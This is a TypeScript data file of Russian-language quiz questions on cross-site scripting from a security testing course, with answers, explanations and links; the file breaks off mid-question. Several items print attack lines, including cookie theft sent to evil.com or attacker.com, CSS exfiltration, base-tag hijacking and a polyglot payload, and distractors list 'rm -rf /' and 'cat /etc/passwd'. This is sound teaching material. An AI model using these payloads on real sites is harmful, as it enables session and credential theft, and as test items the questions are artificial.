export interface QuizQuestion {
    question: string;
    answers: string[];
    correctAnswerIndex: number;
    explanation?: string;
    link?: {
        label: string;
        url: string;
    };
}

export const quizQuestions: QuizQuestion[] = [
    {
        question: "Что означает аббревиатура XSS?",
        answers: [
            "Cross-Site Scripting — межсайтовое выполнение сценариев",
            "Cross-Site Security — межсайтовая безопасность",
            "Cross-System Scripting — межсистемные скрипты",
            "Client-Side Scripting — клиентские сценарии",
            "Cross-Server Scripting — межсерверные скрипты",
            "Common Site Security — общая безопасность сайта",
            "Content Security Standard — стандарт безопасности контента"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS расшифровывается как Cross-Site Scripting. Буква X используется вместо C, чтобы не путать с CSS (Cascading Style Sheets).",
        link: {
            label: "Урок 2: Cross-Site Scripting (XSS)",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-2"
        }
    },
    {
        question: "Где выполняется вредоносный код при XSS-атаке?",
        answers: [
            "В браузере жертвы — это клиентская уязвимость",
            "На сервере приложения в бэкенд-коде",
            "В базе данных при обработке запроса",
            "На прокси-сервере между клиентом и сервером",
            "В операционной системе сервера",
            "На DNS-сервере при разрешении имени",
            "В межсетевом экране (WAF)"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS — это уязвимость клиентской стороны. Код выполняется только в браузере пользователя, поэтому при тестировании API без UI это не имеет смысла.",
        link: {
            label: "Раздел 'Как это работает?'",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-2"
        }
    },
    {
        question: "Что такое Reflected XSS (Отраженный XSS)?",
        answers: [
            "Пейлоад отражается от сервера в ответе и выполняется сразу (например, в URL параметрах или результатах поиска)",
            "Вредоносный скрипт сохраняется в базе данных и выполняется для всех пользователей",
            "Уязвимость в клиентском JavaScript-коде, обрабатывающем DOM",
            "XSS через отражённые заголовки HTTP-ответа",
            "Скрипт, отражающий атаку обратно на злоумышленника",
            "Межсерверная атака через отражённые запросы",
            "XSS в зеркальных копиях сайта"
        ],
        correctAnswerIndex: 0,
        explanation: "При Reflected XSS пейлоад находится в URL или параметрах запроса. Жертва должна перейти по вредоносной ссылке, чтобы скрипт выполнился.",
        link: {
            label: "PortSwigger: Reflected XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/reflected"
        }
    },
    {
        question: "Что такое Stored XSS (Хранимый XSS)?",
        answers: [
            "Вредоносный скрипт сохраняется на сервере (в БД, файле) и срабатывает при каждом просмотре страницы",
            "Пейлоад хранится в URL и передаётся через ссылку жертве",
            "Скрипт, сохранённый в localStorage браузера пользователя",
            "XSS в системах хранения файлов (S3, GCS)",
            "Уязвимость в механизме кеширования браузера",
            "Скрипт, хранящийся в cookies пользователя",
            "XSS в системах резервного копирования"
        ],
        correctAnswerIndex: 0,
        explanation: "Stored XSS считается очень опасной, так как не требует отправки ссылки жертве. Примеры: комментарии, профили, форумы — скрипт выполняется для всех посетителей.",
        link: {
            label: "PortSwigger: Stored XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/stored"
        }
    },
    {
        question: "Что такое DOM-based XSS?",
        answers: [
            "Уязвимость в клиентском JS-коде, когда данные из небезопасного Source попадают в опасный Sink",
            "XSS через манипуляцию с Document Object Model на сервере",
            "Атака через DOM-элементы с определённым ID",
            "XSS в DOM-событиях браузера (onclick, onload)",
            "Уязвимость в доменном имени сайта",
            "XSS через документы (PDF, Word)",
            "Атака на домашние страницы пользователей"
        ],
        correctAnswerIndex: 0,
        explanation: "DOM XSS происходит когда JavaScript берёт данные из Source (location.search, document.referrer) и передаёт их в Sink (innerHTML, eval, document.write).",
        link: {
            label: "PortSwigger: DOM-based XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Что такое 'Source' в контексте DOM XSS?",
        answers: [
            "Свойство JavaScript, содержащее контролируемые злоумышленником данные (location.search, document.referrer, location.hash)",
            "Исходный код приложения на сервере",
            "IP-адрес источника запроса",
            "HTML-тег <source> для медиафайлов",
            "Источник питания клиентского устройства",
            "Файл с исходным кодом JavaScript",
            "Первая страница, с которой пришёл пользователь"
        ],
        correctAnswerIndex: 0,
        explanation: "Source — это точки входа данных в JavaScript. Примеры: location.search, location.hash, document.referrer, window.name, localStorage.",
        link: {
            label: "PortSwigger: DOM XSS Sources",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Что такое 'Sink' в контексте DOM XSS?",
        answers: [
            "Опасная функция или свойство DOM, позволяющее выполнить код (innerHTML, eval, document.write)",
            "Сетевой адаптер для отправки данных",
            "Раковина — физический объект",
            "Механизм синхронизации данных между вкладками",
            "Хранилище для удалённых элементов DOM",
            "Элемент для отображения ошибок",
            "Функция для логирования событий"
        ],
        correctAnswerIndex: 0,
        explanation: "Sink — это точки, где данные могут стать исполняемым кодом. Опасные sink'и: innerHTML, outerHTML, eval(), setTimeout(), document.write(), jQuery.html().",
        link: {
            label: "PortSwigger: DOM XSS Sinks",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Что такое Blind XSS?",
        answers: [
            "Разновидность Stored XSS, когда результат не виден сразу (например, скрипт срабатывает в админке)",
            "XSS, которую атакующий не может увидеть из-за ограничений",
            "Скрипт, делающий страницу невидимой",
            "Атака на слабовидящих пользователей",
            "XSS без визуального индикатора выполнения",
            "Скрытая атака через CSS",
            "XSS в скрытых полях формы"
        ],
        correctAnswerIndex: 0,
        explanation: "При Blind XSS пейлоад сохраняется и срабатывает позже в другом контексте (админ-панель, тикет-система). Для обнаружения используют внешние сервисы вроде XSS Hunter или Burp Collaborator.",
        link: {
            label: "Раздел 'Blind XSS' в уроке",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-2"
        }
    },
    {
        question: "Для чего обычно используется XSS-атака?",
        answers: [
            "Кража Session Cookies, обход MFA, перехват учётных данных, установка кейлоггеров",
            "Только для демонстрации alert() на экране жертвы",
            "Майнинг криптовалюты исключительно",
            "Только для DDoS-атак на сервер",
            "Исключительно для дефейса сайтов",
            "Только для рассылки спама",
            "Только для SEO-манипуляций"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS используется для: перехвата сессий, кражи учётных записей, обхода MFA, подмены DOM-узлов (троянские панели), установки кейлоггеров, чтения локальных данных.",
        link: {
            label: "Раздел 'Для чего используется XSS?'",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-2"
        }
    },
    {
        question: "Как злоумышленник может украсть cookies через XSS?",
        answers: [
            "Отправить document.cookie на свой сервер: new Image().src='http://evil.com/?c='+document.cookie",
            "Cookies невозможно украсть через XSS",
            "Только через физический доступ к компьютеру жертвы",
            "Только путём взлома базы данных сервера",
            "Только через Man-in-the-Middle атаку на HTTPS",
            "Только используя специальное оборудование",
            "Cookies автоматически отправляются всем сайтам"
        ],
        correctAnswerIndex: 0,
        explanation: "Классический способ: document.location='http://attacker.com/?cookie='+document.cookie. Защита: флаг HttpOnly запрещает JS доступ к cookie.",
        link: {
            label: "OWASP XSS Prevention",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Что делает флаг HttpOnly у Cookie?",
        answers: [
            "Запрещает доступ к cookie через JavaScript (document.cookie), защищая от кражи при XSS",
            "Разрешает передачу cookie только по HTTP, запрещая HTTPS",
            "Делает cookie доступным только для HTTP-методов (GET, POST)",
            "Ограничивает размер cookie до определённого лимита",
            "Шифрует cookie с помощью HTTP-протокола",
            "Делает cookie видимым только в HTTP-заголовках",
            "Запрещает отправку cookie в AJAX-запросах"
        ],
        correctAnswerIndex: 0,
        explanation: "HttpOnly не защищает от выполнения XSS — скрипт всё равно выполняется. Но он предотвращает кражу cookie, так как document.cookie не вернёт HttpOnly-cookies.",
        link: {
            label: "MDN: HttpOnly",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies"
        }
    },
    {
        question: "Что такое CSP (Content Security Policy)?",
        answers: [
            "HTTP-заголовок, ограничивающий источники загрузки скриптов, стилей и других ресурсов",
            "Сертификат безопасности для HTTPS-соединения",
            "Протокол шифрования контента сайта",
            "Система проверки подлинности контента",
            "Политика кеширования содержимого браузера",
            "Стандарт компрессии данных",
            "Система контроля версий для веб-страниц"
        ],
        correctAnswerIndex: 0,
        explanation: "CSP помогает от XSS, запрещая inline-скрипты и ограничивая домены, с которых можно загружать JS. Пример: script-src 'self' — только скрипты с того же домена.",
        link: {
            label: "MDN: Content Security Policy",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
        }
    },
    {
        question: "Какой типичный пейлоад используется для PoC (Proof of Concept) XSS?",
        answers: [
            "<script>alert(document.domain)</script> или <img src=x onerror=alert(1)>",
            "rm -rf / — для демонстрации RCE",
            "SELECT * FROM users — для SQL Injection",
            "curl http://evil.com — для SSRF",
            "cat /etc/passwd — для LFI",
            "shutdown -h now — для DoS",
            "DROP TABLE users — для уничтожения данных"
        ],
        correctAnswerIndex: 0,
        explanation: "alert(document.domain) показывает домен, в контексте которого выполняется скрипт. Это доказывает XSS и демонстрирует, что скрипт имеет доступ к данным сайта.",
        link: {
            label: "PortSwigger XSS Cheat Sheet",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Безопасно ли использовать innerHTML для вывода пользовательских данных?",
        answers: [
            "Нет, innerHTML интерпретирует HTML и позволяет внедрить скрипты",
            "Да, innerHTML автоматически экранирует опасные символы",
            "Да, современные браузеры блокируют XSS в innerHTML",
            "Да, если данные приходят от аутентифицированного пользователя",
            "Да, innerHTML безопасен с ES6 и выше",
            "Нет рисков при использовании в React-приложениях",
            "Безопасность зависит от версии браузера"
        ],
        correctAnswerIndex: 0,
        explanation: "innerHTML — опасный sink. Используйте textContent или innerText для безопасного вывода текста, или sanitize HTML через DOMPurify перед вставкой.",
        link: {
            label: "PortSwigger: DOM XSS innerHTML",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Что такое Self-XSS?",
        answers: [
            "XSS, работающая только если пользователь сам введёт пейлоад (социальная инженерия: 'вставь это в консоль')",
            "XSS, которая атакует только того, кто её создал",
            "Автоматический XSS без участия пользователя",
            "XSS в настройках своего профиля",
            "Скрипт для самотестирования приложения",
            "XSS в собственном домене атакующего",
            "Защитный механизм браузера"
        ],
        correctAnswerIndex: 0,
        explanation: "Self-XSS обычно не считается высокой угрозой, так как требует активного участия жертвы. Однако в сочетании с CSRF может стать опасной.",
        link: {
            label: "OWASP Self-XSS",
            url: "https://owasp.org/www-community/attacks/xss/"
        }
    },
    {
        question: "Как защититься от XSS при выводе данных в HTML?",
        answers: [
            "Использовать HTML Entity Encoding: < → &lt;, > → &gt;, & → &amp;, \" → &quot;",
            "Удалять все пробелы и переносы строк из данных",
            "Конвертировать данные в Base64 перед выводом",
            "Использовать только заглавные буквы в выводе",
            "Добавлять случайный суффикс к каждому значению",
            "Шифровать данные с помощью AES-256",
            "Ограничивать длину выводимых данных до 100 символов"
        ],
        correctAnswerIndex: 0,
        explanation: "Контекстное кодирование — ключевая защита. Для HTML используйте HTML entities. Для JavaScript — JS escape. Для URL — URL encoding. Для CSS — CSS escape.",
        link: {
            label: "OWASP XSS Prevention Cheat Sheet",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Что такое контекст (Context) при эксплуатации XSS?",
        answers: [
            "Место в коде, куда попадают данные (тело HTML, атрибут, JS-блок, CSS) — от этого зависит вектор атаки",
            "Смысловой контекст текста на странице",
            "Контекстная реклама на сайте",
            "Размер окна браузера пользователя",
            "Версия браузера и ОС жертвы",
            "Язык интерфейса приложения",
            "Время суток при выполнении атаки"
        ],
        correctAnswerIndex: 0,
        explanation: "Разные контексты требуют разных пейлоадов. В атрибуте: \"> <!-- закрыть атрибут. В JS-строке: '; — закрыть строку. В CSS: expression() для старых IE.",
        link: {
            label: "PortSwigger: XSS Contexts",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Какой инструмент популярен для эксплуатации и пост-эксплуатации XSS?",
        answers: [
            "BeEF (Browser Exploitation Framework) — фреймворк для управления браузерами жертв",
            "Metasploit — только для серверных эксплойтов",
            "Nmap — для сканирования портов",
            "Wireshark — для анализа трафика",
            "Burp Suite — только для перехвата запросов",
            "OWASP ZAP — только для автоматического сканирования",
            "Nikto — для поиска уязвимостей веб-сервера"
        ],
        correctAnswerIndex: 0,
        explanation: "BeEF позволяет 'подцепить' браузер жертвы через XSS и выполнять команды: кража cookies, сканирование сети, установка кейлоггера, фишинг.",
        link: {
            label: "BeEF Framework",
            url: "https://beefproject.com/"
        }
    },
    {
        question: "Можно ли выполнить XSS через событие onerror?",
        answers: [
            "Да: <img src=x onerror=alert(1)> — ошибка загрузки изображения вызывает обработчик",
            "Нет, onerror не может выполнять JavaScript",
            "Только в устаревших браузерах до 2015 года",
            "Только если пользователь нажмёт на изображение",
            "Только для SVG-изображений",
            "Только при загрузке по HTTPS",
            "Нет, современные CSP блокируют onerror"
        ],
        correctAnswerIndex: 0,
        explanation: "Event handlers (onerror, onload, onmouseover) — популярные векторы XSS, когда <script> заблокирован. Работают на img, svg, body, input и других элементах.",
        link: {
            label: "PortSwigger XSS Cheat Sheet",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Что такое DOMPurify?",
        answers: [
            "JavaScript-библиотека для безопасной санитизации HTML, защищающая от DOM XSS",
            "Встроенная функция браузера для очистки DOM",
            "Плагин для React для безопасного рендеринга",
            "Антивирус для веб-страниц",
            "Утилита для сжатия HTML-кода",
            "Инструмент для тестирования производительности DOM",
            "Расширение браузера для блокировки скриптов"
        ],
        correctAnswerIndex: 0,
        explanation: "DOMPurify удаляет опасные элементы и атрибуты из HTML, оставляя безопасный контент. Это рекомендованное решение при необходимости вставлять HTML от пользователей.",
        link: {
            label: "DOMPurify GitHub",
            url: "https://github.com/cure53/DOMPurify"
        }
    },
    {
        question: "Как CSP помогает защититься от XSS?",
        answers: [
            "Запрещая выполнение inline-скриптов и ограничивая домены для загрузки JS-файлов",
            "Шифрует все скрипты на странице перед выполнением",
            "Автоматически удаляет подозрительные скрипты",
            "Блокирует IP-адреса известных хакеров",
            "Сканирует код на вирусы перед запуском",
            "Отключает JavaScript в браузере пользователя",
            "Заменяет все скрипты на безопасные аналоги"
        ],
        correctAnswerIndex: 0,
        explanation: "CSP с директивой script-src 'self' запрещает inline-скрипты и разрешает загрузку только с того же домена. Это значительно усложняет эксплуатацию XSS.",
        link: {
            label: "MDN: CSP script-src",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"
        }
    },
    {
        question: "Как эксплуатировать XSS внутри HTML-атрибута value=\"...\"?",
        answers: [
            "Закрыть атрибут и тег: \"> <script>alert(1)</script> или использовать событие \" onmouseover=alert(1)",
            "Просто написать <script> внутри атрибута",
            "Использовать пробелы для разделения кода",
            "XSS внутри атрибутов невозможна",
            "Добавить несколько кавычек подряд",
            "Использовать обратные кавычки (`)",
            "Написать код в Unicode-формате"
        ],
        correctAnswerIndex: 0,
        explanation: "Для выхода из контекста атрибута нужно закрыть кавычку. Затем можно добавить новый атрибут с событием или закрыть тег и вставить скрипт.",
        link: {
            label: "PortSwigger: XSS in attribute context",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Что такое Polyglot XSS vector?",
        answers: [
            "Универсальный пейлоад, работающий сразу в нескольких контекстах (HTML, JS, атрибуты)",
            "Многоязычный скрипт для интернационализации",
            "Векторная графика с вредоносным кодом",
            "Сложный пароль для защиты от XSS",
            "Специальный формат файлов для XSS",
            "Набор инструментов для тестирования",
            "Мультиплатформенный эксплойт"
        ],
        correctAnswerIndex: 0,
        explanation: "Polyglot пейлоады экономят время при тестировании, так как один payload может сработать независимо от контекста вставки. Пример: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//",
        link: {
            label: "PortSwigger XSS Cheat Sheet",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Что такое JavaScript Keylogger в контексте XSS?",
        answers: [
            "Скрипт, перехватывающий нажатия клавиш через document.onkeypress и отправляющий их атакующему",
            "Специальный логгер для отладки JavaScript",
            "Инструмент для записи музыки в браузере",
            "Менеджер паролей на JavaScript",
            "Система логирования ошибок",
            "Расширение для клавиатуры браузера",
            "Библиотека для работы с горячими клавишами"
        ],
        correctAnswerIndex: 0,
        explanation: "Кейлоггер — опасное применение XSS. Он записывает все введённые символы (включая пароли) и отправляет их на сервер атакующего через fetch или Image().",
        link: {
            label: "BeEF Keylogger Module",
            url: "https://beefproject.com/"
        }
    },
    {
        question: "Можно ли через XSS сканировать внутреннюю сеть жертвы?",
        answers: [
            "Да, отправляя запросы на внутренние IP (192.168.x.x, 10.x.x.x) и анализируя время ответа или ошибки",
            "Нет, браузер полностью запрещает доступ к внутренней сети",
            "Только если установлен специальный плагин",
            "Только в устаревших браузерах без SOP",
            "Только после установки VPN-соединения",
            "Нет, это требует серверного кода",
            "Только с разрешения пользователя"
        ],
        correctAnswerIndex: 0,
        explanation: "JavaScript может отправлять запросы к внутренним IP. Хотя CORS блокирует чтение ответа, можно определить доступность хостов по времени ответа или оnerror/onload.",
        link: {
            label: "BeEF Network Discovery",
            url: "https://beefproject.com/"
        }
    },
    {
        question: "Что такое XSS через onmouseover?",
        answers: [
            "Выполнение скрипта при наведении мыши: <div onmouseover=alert(1)>наведи</div>",
            "Атака через компьютерную мышь",
            "Скрипт, следящий за движением курсора",
            "Overlay-атака поверх страницы",
            "Специальный тип DOM-XSS",
            "XSS только для мобильных устройств",
            "Атака через touchpad ноутбука"
        ],
        correctAnswerIndex: 0,
        explanation: "Event handlers — альтернатива <script> когда он заблокирован. onmouseover, onclick, onfocus, onload — все могут выполнять JavaScript.",
        link: {
            label: "PortSwigger XSS Cheat Sheet - Events",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Какой атрибут HTML5 защищает iframe от XSS?",
        answers: [
            "sandbox — ограничивает возможности содержимого iframe (скрипты, формы, top-navigation)",
            "security — включает защищённый режим",
            "protected — блокирует вредоносный код",
            "safe-mode — активирует безопасный режим",
            "restrict — ограничивает доступ к DOM",
            "shield — защитный экран для iframe",
            "guard — охранный атрибут"
        ],
        correctAnswerIndex: 0,
        explanation: "sandbox='allow-scripts' разрешает скрипты, но по умолчанию sandbox без значений блокирует почти всё. Это защищает от XSS во встроенном контенте.",
        link: {
            label: "MDN: iframe sandbox",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox"
        }
    },
    {
        question: "Можно ли выполнить XSS через CSS?",
        answers: [
            "В старых браузерах через expression() и behavior, в современных — через CSS exfiltration данных",
            "Нет, CSS никогда не может выполнять JavaScript",
            "Да, во всех браузерах через @import",
            "Только через специальные CSS-фреймворки",
            "Только в SVG-файлах со стилями",
            "Да, через CSS-переменные",
            "Только при отключённом CSP"
        ],
        correctAnswerIndex: 0,
        explanation: "expression() работал в IE. В современных браузерах CSS может украсть данные через селекторы атрибутов: input[value^='a']{background:url(//evil.com?a)}",
        link: {
            label: "CSS Injection",
            url: "https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities"
        }
    },
    {
        question: "Что такое Mutation XSS (mXSS)?",
        answers: [
            "Атака, когда браузер 'исправляет' некорректный HTML, превращая безопасную строку в исполняемый код",
            "XSS через генетические мутации кода",
            "Постоянно изменяющийся пейлоад",
            "Атака на системы с частыми обновлениями",
            "XSS в мутабельных структурах данных",
            "Биологическая метафора для вирусов",
            "Мутация DOM после загрузки страницы"
        ],
        correctAnswerIndex: 0,
        explanation: "mXSS происходит когда sanitizer пропускает строку, но браузер при парсинге HTML мутирует её в опасную форму. Это сложная атака против DOMPurify и других фильтров.",
        link: {
            label: "Cure53: mXSS Attacks",
            url: "https://cure53.de/fp170.pdf"
        }
    },
    {
        question: "Что такое Dangling Markup Injection?",
        answers: [
            "Внедрение незакрытого тега (<img src='), который 'захватывает' часть страницы и отправляет её атакующему",
            "Висящий код без функции",
            "Ошибка вёрстки с незакрытыми тегами",
            "Специальная разметка для подвесных элементов",
            "Внедрение CSS для анимации",
            "Атака на принтеры через HTML",
            "Ошибки форматирования в Markdown"
        ],
        correctAnswerIndex: 0,
        explanation: "Незакрытый атрибут src='... захватывает HTML до следующей одинарной кавычки. Это позволяет украсть CSRF-токены и другие данные даже без выполнения JS.",
        link: {
            label: "PortSwigger: Dangling Markup",
            url: "https://portswigger.net/web-security/cross-site-scripting/dangling-markup"
        }
    },
    {
        question: "Что такое Script Gadgets в контексте XSS?",
        answers: [
            "Легитимные фрагменты JS-кода в библиотеках, которые можно использовать для обхода CSP или XSS-фильтров",
            "Устройства для выполнения скриптов",
            "Плагины браузера для разработчиков",
            "Инструменты хакера для атак",
            "Специальные теги HTML5",
            "Виджеты на JavaScript",
            "Гаджеты для мобильных браузеров"
        ],
        correctAnswerIndex: 0,
        explanation: "Script Gadgets — код в jQuery, Angular, Bootstrap, который можно использовать как 'строительные блоки' для атаки, обходя защиту.",
        link: {
            label: "Google Security Research: Script Gadgets",
            url: "https://research.google/pubs/pub45542/"
        }
    },
    {
        question: "Какой заголовок X-XSS-Protection рекомендуется устанавливать сейчас?",
        answers: [
            "X-XSS-Protection: 0 — отключить фильтр, так как он создавал новые уязвимости. Лучше использовать CSP",
            "X-XSS-Protection: 1; mode=block — максимальная защита",
            "X-XSS-Protection: 1 — включить базовую защиту",
            "X-XSS-Protection: 2 — усиленный режим",
            "Не устанавливать этот заголовок вообще",
            "X-XSS-Protection: auto — автоматический режим",
            "X-XSS-Protection: strict — строгий режим"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS Auditor в Chrome/Safari был удалён, так как создавал XS-Leak уязвимости. Рекомендуется отключить и полагаться на CSP.",
        link: {
            label: "MDN: X-XSS-Protection",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"
        }
    },
    {
        question: "Что такое javascript: pseudo-protocol?",
        answers: [
            "Протокол в URL (javascript:alert(1)), выполняющий JS при переходе по ссылке или в src iframe",
            "Новый стандарт JavaScript ES2024",
            "Защищённый протокол для скриптов",
            "Фейковый протокол для тестирования",
            "Протокол связи между скриптами",
            "Шифрованный канал для JS-кода",
            "Альтернатива HTTP для скриптов"
        ],
        correctAnswerIndex: 0,
        explanation: "<a href='javascript:alert(1)'>click</a> выполнит код при клике. Современные фреймворки блокируют это, но нужно проверять.",
        link: {
            label: "PortSwigger: XSS via javascript:",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Безопасен ли React по умолчанию от XSS?",
        answers: [
            "Да, JSX автоматически экранирует данные. Но dangerouslySetInnerHTML и некоторые props (href с javascript:) опасны",
            "Нет, React полностью уязвим к XSS",
            "Только в продакшн-режиме с минификацией",
            "Только при использовании TypeScript",
            "Только с включённым StrictMode",
            "Нет, только Angular безопасен",
            "Зависит от версии React"
        ],
        correctAnswerIndex: 0,
        explanation: "React экранирует {data} в JSX, но dangerouslySetInnerHTML={{__html: data}} вставляет сырой HTML. Также опасны href='javascript:', src, и некоторые SVG-атрибуты.",
        link: {
            label: "React Security",
            url: "https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml"
        }
    },
    {
        question: "Что делает dangerouslySetInnerHTML в React?",
        answers: [
            "Вставляет сырой HTML без экранирования — аналог innerHTML. Требует объект {__html: string}",
            "Делает компонент максимально безопасным",
            "Удаляет потенциально опасный HTML",
            "Шифрует HTML перед вставкой",
            "Логирует подозрительный контент",
            "Блокирует XSS автоматически",
            "Включает режим безопасности React"
        ],
        correctAnswerIndex: 0,
        explanation: "Название 'dangerously' — напоминание об опасности. Перед использованием обязательно sanitize через DOMPurify: {__html: DOMPurify.sanitize(data)}",
        link: {
            label: "React: dangerouslySetInnerHTML",
            url: "https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml"
        }
    },
    {
        question: "Какая директива Vue.js аналогична dangerouslySetInnerHTML?",
        answers: [
            "v-html — вставляет сырой HTML и может привести к XSS при использовании с пользовательскими данными",
            "v-text — для текста",
            "v-safe — безопасная вставка",
            "v-secure — защищённый режим",
            "v-bind — привязка данных",
            "v-raw — сырые данные",
            "v-danger — опасный режим"
        ],
        correctAnswerIndex: 0,
        explanation: "{{ data }} в Vue безопасно экранируется. Но v-html вставляет HTML как есть. Используйте DOMPurify перед v-html.",
        link: {
            label: "Vue.js: v-html",
            url: "https://vuejs.org/api/built-in-directives.html#v-html"
        }
    },
    {
        question: "Как SVG-файлы могут содержать XSS?",
        answers: [
            "SVG — это XML, он поддерживает <script>, события (onload, onclick), и внешние ресурсы",
            "SVG-файлы не могут содержать скрипты",
            "Только через специальные плагины браузера",
            "Только в пикселях изображения",
            "Только в метаданных EXIF",
            "Только в имени файла",
            "SVG всегда безопасен как изображение"
        ],
        correctAnswerIndex: 0,
        explanation: "<svg onload=alert(1)> или <svg><script>alert(1)</script></svg> — валидные XSS через SVG. При загрузке SVG нужна санитизация.",
        link: {
            label: "PortSwigger: SVG XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Можно ли через XSS получить RCE (Remote Code Execution)?",
        answers: [
            "Напрямую нет (код в браузере), но косвенно да: через Electron-приложения, браузерные эксплойты, или атаку на админку",
            "Да, XSS всегда даёт RCE на сервере",
            "Нет, XSS никогда не приводит к RCE",
            "Только на Linux-серверах",
            "Только при использовании Node.js",
            "Только через WebSocket-соединения",
            "Только в мобильных браузерах"
        ],
        correctAnswerIndex: 0,
        explanation: "В Electron nodeIntegration:true позволяет require('child_process'). Также XSS в админке может дать RCE через функции управления сервером.",
        link: {
            label: "Electron Security",
            url: "https://www.electronjs.org/docs/latest/tutorial/security"
        }
    },
    {
        question: "Что такое XSS Auditor и почему он был удалён?",
        answers: [
            "Встроенный фильтр Chrome/Safari, удалённый из-за XS-Leak уязвимостей и ложных срабатываний",
            "Инструмент для аудита безопасности сайтов",
            "Человек, проверяющий сайты на XSS",
            "Плагин для поиска уязвимостей",
            "Автоматический сканер в DevTools",
            "Расширение браузера для разработчиков",
            "Сервис для проверки CSP"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS Auditor пытался блокировать Reflected XSS, но создавал информационные утечки и иногда блокировал легитимный код.",
        link: {
            label: "Chromium: XSS Auditor Removal",
            url: "https://www.chromestatus.com/feature/5021976655560704"
        }
    },
    {
        question: "Что такое Markdown XSS?",
        answers: [
            "XSS через синтаксис Markdown: [click](javascript:alert(1)) или ![img](x onerror=alert(1))",
            "XSS в текстовых редакторах",
            "Разметка для безопасного текста",
            "Специальный формат документов",
            "XSS в файлах .md на GitHub",
            "Атака на Markdown-парсеры сервера",
            "Защита от XSS через форматирование"
        ],
        correctAnswerIndex: 0,
        explanation: "Markdown-парсеры, преобразующие [text](url) в <a href>, могут пропустить javascript:. Используйте whitelist протоколов (http, https).",
        link: {
            label: "Markdown Security",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    },
    {
        question: "Что такое 'XSS Auditor'?",
        answers: [
            "Компонент браузеров (Chrome, Safari), пытавшийся блокировать Reflected XSS. Был удален из-за проблем",
            "Аудитор кода",
            "Человек проверяющий XSS",
            "Программа сканирования"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Для чего при XSS используют <sVg/oNlOad=alert(1)> (смешанный регистр)?",
        answers: [
            "Для обхода простых фильтров, проверяющих только <script> или lowercase",
            "Для красоты",
            "Это ошибка",
            "Так требует стандарт"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое BASE tag hijacking?",
        answers: [
            "Внедрение <base href='evil.com'>, изменяющего базовый URL для всех относительных ссылок и скриптов",
            "Захват базы данных через XSS",
            "Кража данных из base64-строк",
            "Взлом базовой аутентификации",
            "Перехват базовых классов JavaScript",
            "Атака на BASE64-кодирование",
            "Подмена базового домена в DNS"
        ],
        correctAnswerIndex: 0,
        explanation: "После <base href='http://evil.com'> все относительные пути (/script.js) будут загружаться с evil.com. Это мощная техника даже без выполнения JS.",
        link: {
            label: "PortSwigger: BASE tag",
            url: "https://portswigger.net/web-security/cross-site-scripting/dangling-markup"
        }
    },
    {
        question: "В чём разница между encodeURI и encodeURIComponent?",
        answers: [
            "encodeURIComponent кодирует больше символов (включая / ? & =), что важно для безопасной передачи параметров",
            "Они абсолютно идентичны",
            "encodeURI быстрее работает",
            "encodeURIComponent устарела",
            "Разница только в названии функций",
            "encodeURI для HTTP, encodeURIComponent для HTTPS",
            "encodeURIComponent только для JSON"
        ],
        correctAnswerIndex: 0,
        explanation: "encodeURIComponent('a=b&c=d') → 'a%3Db%26c%3Dd'. Используйте его для значений параметров. encodeURI сохраняет структуру URL (:, /, ?).",
        link: {
            label: "MDN: encodeURIComponent",
            url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent"
        }
    },
    {
        question: "Выполнится ли <script> внутри тега <textarea>?",
        answers: [
            "Нет, textarea — RCDATA-контекст, код отобразится как текст",
            "Да, скрипт выполнится при рендеринге",
            "Да, но только после отправки формы",
            "Зависит от браузера",
            "Да, если textarea получит фокус",
            "Нет, но через onload выполнится",
            "Да, в старых версиях IE"
        ],
        correctAnswerIndex: 0,
        explanation: "<textarea>, <title>, <style>, <script> — RCDATA/rawtext теги, где HTML не интерпретируется. Но нужно экранировать </textarea> чтобы не закрыть тег.",
        link: {
